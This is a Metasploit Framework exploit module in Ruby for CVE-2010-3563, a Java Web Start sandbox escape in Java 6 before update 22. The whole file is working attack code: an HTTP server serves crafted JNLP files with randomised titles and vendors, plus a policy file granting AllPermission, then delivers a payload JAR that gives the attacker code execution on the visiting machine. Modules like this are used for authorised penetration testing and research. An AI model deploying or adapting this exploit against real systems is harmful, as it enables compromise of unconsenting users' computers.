##
# $Id: java_basicservice_impl.rb 11623 2011-01-22 00:16:57Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer
	# Internet explorer freaks out and shows the scary yellow info bar if this
	# is in an iframe.  The exploit itself also creates a couple of scary popup
	# windows about "downloading application" that I haven't been able to
	# figure out how to prevent.  For both of these reasons, don't include it
	# in Browser Autopwn.
	#include Msf::Exploit::Remote::BrowserAutopwn
	#autopwn_info({ :javascript => false })

	def initialize( info = {} )

		super( update_info( info,
			'Name'          => 'Sun Java Web Start BasicServiceImpl Remote Code Execution Exploit',
			'Description'   => %q{
			This module exploits a vulnerability in Java Runtime Environment
			that allows an attacker to escape the Java Sandbox. By injecting
			a parameter into a javaws call within the BasicServiceImpl class
			the default java sandbox policy file can be therefore overwritten.
			The vulnerability affects version 6 prior to update 22.

			NOTE: Exploiting this vulnerability causes several sinister-looking
			popup windows saying that Java is "Downloading application."
			},
			'License'       => MSF_LICENSE,
			'Author'        => [
				'Matthias Kaiser', # Discovery, PoC, metasploit module
				'egypt' # metasploit module
			],
			'Version'       => '$Revision: 11623 $',
			'References'    =>
			[
				[ 'CVE', '2010-3563' ],
				[ 'OSVDB', '69043' ],
				[ 'URL', 'http://mk41ser.blogspot.com' ],
			],
			'Platform'      => [ 'java', 'win' ],
			'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },
			'Targets'       =>
				[
					[ 'Windows x86',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'win',
						}
					],
					[ 'Generic (Java Payload)',
						{
							'Arch' => ARCH_JAVA,
							'Platform' => 'java',
						}
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Oct 12 2010'
			))
	end

	def on_request_uri( cli, request )
		jpath = get_uri(cli)

		case request.uri
		when /java.security.policy/
			print_status("Checking with HEAD")
			ack = "OK"
			send_response(cli, ack, { 'Content-Type' => 'application/x-java-jnlp-file' })

		when /all.policy/
			all = "grant {permission java.security.AllPermission;};\n"
			print_status("Sending all.policy")
			send_response(cli, all, { 'Content-Type' => 'application/octet-stream' })

		when /init.jnlp/
			init = <<-EOS
<?xml version="1.0" encoding="UTF-8"?>
<jnlp href="#{jpath}/init.jnlp" version="1">
#{jnlp_info}
	<application-desc main-class="BasicServiceExploit">
		<argument>#{jpath}</argument>
	</application-desc>
</jnlp>
EOS
			print_status("Sending init.jnlp")
			send_response(cli, init, { 'Content-Type' => 'application/x-java-jnlp-file' })

		when /exploit.jnlp/
			expl = <<-EOS
<?xml version="1.0" encoding="UTF-8"?>
	<jnlp href="#{jpath}/exploit.jnlp" version="1">
#{jnlp_info}
	<application-desc main-class="Exploit"/>
	</jnlp>
EOS
			print_status("Sending exploit.jnlp")
			send_response(cli, expl, { 'Content-Type' => 'application/x-java-jnlp-file' })

		when /\.jar$/i
			p = regenerate_payload(cli)
			paths = [
				[ "BasicServiceExploit.class" ],
				[ "Exploit.class" ],
			]
			dir = [ Msf::Config.data_directory, "exploits", "cve-2010-3563" ]
			jar = p.encoded_jar
			jar.add_files(paths, dir)
			print_status("Sending Jar file to #{cli.peerhost}:#{cli.peerport}...")
			send_response(cli, jar.pack, { 'Content-Type' => "application/octet-stream" })
			handler(cli)

		else
			print_status("Sending redirect to init.jnlp")
			send_redirect(cli, get_resource() + '/init.jnlp', '')

		end
	end

	def jnlp_info
		buf = <<-EOS
		<information>
			<title>#{Rex::Text.rand_text_alpha(rand(10)+10)}</title>
			<vendor>#{Rex::Text.rand_text_alpha(rand(10)+10)}</vendor>
			<description>#{Rex::Text.rand_text_alpha(rand(10)+10)}</description>
		</information>
		<resources>
			<java version="1.6+"/>
			<jar href="#{get_uri}/exploit.jar"/>
		</resources>
EOS
	end
end
